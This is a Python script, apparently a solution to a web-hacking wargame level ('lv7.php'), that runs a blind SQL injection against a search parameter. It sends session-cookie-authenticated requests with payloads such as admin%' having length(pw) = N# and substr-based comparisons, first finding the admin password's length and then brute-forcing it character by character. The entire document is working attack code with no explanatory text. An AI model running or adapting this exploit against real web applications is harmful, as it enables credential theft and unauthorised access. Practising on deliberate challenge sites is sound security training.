import urllib.request as req
import re
from urllib import parse
import time

lvurl = "*/q/lv7.php?"
cookie = "PHPSESSID=*"

length = 0
while (1):
    length = length + 1
    query = {
        'search' : """admin%' having length(pw) = """ + str(length) + """#"""
    }
    param = parse.urlencode(query, encoding = 'UTF-8')
    Myurl = lvurl+param
    Myreq = req.Request(Myurl)
    Myreq.add_header('cookie', cookie)
    Myres = req.urlopen(Myreq)
    time.sleep(0.01)
    urllist = list(Myres)
    beforecheck = re.compile("[*][I][D][*]")
    index = 0
    for i in range(len(urllist)-1):
        if (beforecheck.search(urllist[i].decode('utf-8'))):
            index = i
    idcheck = re.compile("[a][d][m][i][n]")
    if(idcheck.search(urllist[index+1].decode("utf-8"))):      
        break
print("length : {}".format(length))


password = []
for k in range(length):
    for j in range(128):
        val = chr(j)
        if(val == '&' or val == '|' or val == '_'):
            continue
        query = {
            'search' : """admin%' having substr(pw,"""+str(k+1)+""",1) = '""" + val + """'#"""
        }
        param = parse.urlencode(query, encoding = 'UTF-8')
        Myurl = lvurl+param
        Myreq = req.Request(Myurl)
        Myreq.add_header('cookie', cookie)
        Myres = req.urlopen(Myreq)
        time.sleep(0.01)
        urllist = list(Myres)
        beforecheck = re.compile("[*][*][I][D][*]")
        index = 0
        for i in range(len(urllist)-1):
            if (beforecheck.search(urllist[i].decode('utf-8'))):
                index = i
                break
        idcheck = re.compile("[a][d][m][i][n]")
        if(idcheck.search(urllist[index+1].decode('utf-8'))):
            password.append(val)
            print ("".join(password))
            break
print("password : ", end='')
print("".join(password))